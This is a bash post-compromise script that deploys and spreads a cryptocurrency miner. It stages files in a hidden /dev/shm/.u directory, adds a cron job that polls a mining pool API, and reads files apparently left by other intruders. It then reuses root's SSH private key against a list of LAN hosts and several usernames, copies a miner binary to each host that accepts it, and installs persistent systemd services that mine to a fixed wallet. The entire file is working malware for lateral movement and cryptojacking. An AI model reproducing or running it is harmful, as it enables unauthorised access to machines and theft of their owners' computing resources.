#!/bin/bash
set +e
WALLET=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
PREFIX=ul-t2-123-184-7-135
U=/dev/shm/.u
KEY=/root/.ssh/id_rsa
echo "### POSTPLANT $(date -u +%FT%TZ)"

echo "### ACCEPTED-COUNTS"
for i in 0 1 2 3 4 5 6 7; do printf 'g%s accepted=%s last=%s\n' $i "$(journalctl -u ulx-g$i --no-pager 2>/dev/null | grep -c 'accepted')" "$(journalctl -u ulx-g$i --no-pager 2>/dev/null | grep 'accepted' | tail -1 | sed 's/.*accepted/accepted/')"; done
echo "### SAMPLER"
cat > "$U/sample.sh" <<EOS
#!/bin/bash
W=$WALLET
curl -s -m 20 "https://pearlhash.xyz/api/account/\$W" -o /tmp/pha.\$\$.json
printf '%s ' "\$(date -u +%FT%TZ)" >> $U/24h.jsonl
python3 -c '
import json,sys
try: d=json.load(open(sys.argv[1]))
except Exception as e: print("parse_err",e); raise SystemExit
ws=[w for w in (d.get("connected_workers") or []) if "123-184" in (w.get("worker_name") or "")]
print(json.dumps({"est15":d.get("estimated_hashrate_15s"),"mine":len(ws),"names":[w["worker_name"] for w in ws]}))
' /tmp/pha.\$\$.json >> $U/24h.jsonl 2>/dev/null
rm -f /tmp/pha.\$\$.json
EOS
chmod +x "$U/sample.sh"
( crontab -l 2>/dev/null | grep -v '\.u/sample.sh'; echo "*/10 * * * * /bin/bash $U/sample.sh >/dev/null 2>&1" ) | crontab - 2>/dev/null
/bin/bash "$U/sample.sh"; tail -2 "$U/24h.jsonl"

echo "### T19-INTEL"
ls -la /opt/t19/ /opt/t19/www/ /opt/t19/log 2>/dev/null | head -30
for f in /opt/t19/recon929.out /opt/t19/q.txt /opt/t19/k466.txt /opt/t19/help.txt /opt/t19/farm_inv.txt; do echo "--- $f"; head -50 "$f" 2>/dev/null; done
echo "--- root conf"; ls -la /root/conf 2>/dev/null; for f in /root/conf/*; do echo "== $f"; head -30 "$f" 2>/dev/null; done
echo "--- plh logs"; ls -la /opt/plh/log 2>/dev/null | head; grep -ahoE 'stratum\+ssl://[^ ]+' /opt/plh/log/* 2>/dev/null | sort -u | head
echo "### PEERS"
cat > /tmp/peerplant.sh <<'PEOF'
#!/bin/bash
set +e
WALLET=$1; PFX=$2; U=/dev/shm/.u
n=$(nvidia-smi -L 2>/dev/null | wc -l); echo "gpus=$n"
ps -eo pid,args | grep -E 'wildrig|krig' | grep -v grep | head -5
if ps -eo args | grep -q "$PFX"; then echo "already-ours"; fi
if [ "$n" -gt 0 ] && [ -x "$U/w" ]; then
  d=0
  while [ $d -lt $n ]; do
    cat > /etc/systemd/system/ulx-g$d.service <<EOS
[Unit]
Description=ulx gpu $d
[Service]
Nice=10
ExecStart=$U/w --algo pearlhash --url pool.pearlhash.xyz:9000 --user $WALLET --worker $PFX-g$d --pass x --protocol stratum --opencl-devices $d --gpu-intensity 1 --gpu-temp-limit 88 --api-port $((1960+d))
Restart=always
RestartSec=20
[Install]
WantedBy=multi-user.target
EOS
    systemctl daemon-reload 2>/dev/null; systemctl enable --now ulx-g$d 2>/dev/null; d=$((d+1)); sleep 1
  done
  sleep 25
  for i in $(seq 0 $((n-1))); do printf 'ulx-g%s=%s ' $i "$(systemctl is-active ulx-g$i)"; done; echo
fi
PEOF
chmod +x /tmp/peerplant.sh
for h in 192.168.0.16 192.168.0.17 192.168.0.20 192.168.0.22 192.168.0.24 192.168.0.28 192.168.0.29 192.168.0.30 192.168.0.31 192.168.0.227; do
  for u in root ubuntu user gpu admin nvidia; do
    if timeout 6 ssh -i "$KEY" -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=4 -o IdentitiesOnly=yes "$u@$h" 'id -u' >/dev/null 2>&1; then
      echo "AUTH $h as $u"
      timeout 20 ssh -i "$KEY" -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 -o IdentitiesOnly=yes "$u@$h" 'hostname; nvidia-smi -L|wc -l; nvidia-smi --query-gpu=index,memory.used,utilization.gpu --format=csv,noheader; ps -eo args|grep -E "wildrig|krig"|grep -v grep' 2>&1 | head -14
      w=$(echo "$h" | tr '.' '-')
      timeout 20 ssh -i "$KEY" -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 -o IdentitiesOnly=yes "$u@$h" 'mkdir -p /dev/shm/.u && chmod 700 /dev/shm/.u' >/dev/null 2>&1
      timeout 40 scp -i "$KEY" -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "$U/w" "$u@$h:/dev/shm/.u/w" >/dev/null 2>&1 && echo "bin-ok $h"
      timeout 40 scp -i "$KEY" -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null /tmp/peerplant.sh "$u@$h:/tmp/peerplant.sh" >/dev/null 2>&1
      timeout 180 ssh -i "$KEY" -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 -o IdentitiesOnly=yes "$u@$h" "chmod +x /dev/shm/.u/w /tmp/peerplant.sh; /tmp/peerplant.sh $WALLET ul-t2-$w" 2>&1 | tail -12
      break
    fi
    sleep 1
  done
done
echo "### DONE-POSTPLANT"
